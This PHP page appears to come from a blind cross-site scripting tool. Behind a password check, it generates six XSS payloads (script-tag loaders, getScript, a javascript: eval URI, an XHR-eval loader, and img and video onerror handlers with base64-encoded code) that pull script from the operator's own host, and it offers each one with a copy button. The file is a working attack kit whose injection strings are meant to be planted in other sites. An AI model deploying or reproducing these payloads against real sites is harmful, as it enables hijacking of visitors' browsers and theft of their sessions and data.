<?php
session_start();
include("../inc/conf.php");

if(!empty($pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $pass))
        $_SESSION['auth'] = md5($_POST['pass']);
    if (!isset($_SESSION['auth']) || ($_SESSION['auth'] != $pass))
        login();
}

if(isset($_GET['logout'])){
	session_destroy();
	header("location: ?");
}

$host = $_SERVER['HTTP_HOST'];
$b64 = base64_encode('var a=document.createElement("script");a.src="'.$host.'";document.body.appendChild(a);');

$payload = array(
        '"><script src=http://'.$host.'></script>',
        '<script>$.getScript("//'.$host.'")</script>',
        "javascript:eval('var a=document.createElement(\'script\');a.src=\'http://".$host."\';document.body.appendChild(a)')",
        '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//'.$host.'");a.send();</script>',
        '"><video><source onerror=eval(atob(this.id)) id='.$b64.'&#61;>',
        '"><img src=x id='.$b64.'&#61; onerror=eval(atob(this.id))>'
    );

$t = count(array_filter(json_decode(getAll($db))->result));
include("header.php");

?>
    <!-- Page Content -->
    <div class="container">
    	<div class="jumbotron">
    		<div class="row">
                <?php
                $i = 1;
                foreach ($payload as $d) {
                ?>
                <div class="col-md-4"> 
                    <div class="card">
                        <div class="card-header">
                            <span class="text-mono text-<?=$warna;?>">
                            <span class="fa fa-crosshairs"></span> Payload <?=$i;?>
                            </span>
                            <button onClick="document.getElementById('<?=$i;?>').select();document.execCommand('Copy');
  alert('XSS Payload <?=$i;?> Copied');" class="btn btn-shadow btn-sm btn-outline-<?=$warna;?>">
                                <span class="fa fa-code"></span>
                            </button>
                        </div>
                        <div class="card-body">
                            <div class="form-group">
                                <textarea class="form-control" id="<?=$i;?>"><?=$d;?></textarea>
                            </div>
                        </div>
                    </div>
                    <hr>
                </div>
                <?php $i++;} ?>
    		</div>
    	</div>
    </div>

<?php
include("footer.php");
?>